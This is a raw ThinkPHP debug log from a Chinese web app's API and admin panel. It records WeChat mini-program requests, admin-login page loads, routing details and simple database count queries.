[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_notices` WHERE  `uid` = 1000017  AND `type` = 'no' LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:48+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/remind
[ info ] picc.18178.net/relaxed/public/index.php/api/content/remind [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：2,465.50kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'remind',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->remind[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_indent` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_indent` WHERE  `type` = 'no'  AND `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:58+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/usenotice
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/usenotice [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：2,447.41kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'usenotice',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->usenotice[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_notices` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_notices` WHERE  `uid` = 1000017  AND `type` = 'no' LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:58+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/remind
[ info ] picc.18178.net/relaxed/public/index.php/api/content/remind [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：2,465.50kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'remind',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
[ info ] [ RUN ] app\api\controller\Content->remind[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_indent` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_indent` WHERE  `type` = 'no'  AND `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T16:33:50+08:00 ] 60.191.38.77 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,212.13kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-13T16:46:44+08:00 ] 60.191.38.77 GET /relaxed/public/index.php/admin/index/login
[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,212.13kb] [文件加载：80]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
  0 => 'breadcrumb',
  1 => 'site',
  2 => 'config',
  3 => 'auth',
  4 => 'admin',
  5 => 'background',
  6 => 'title',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
[ info ] [ LOG ] INIT File
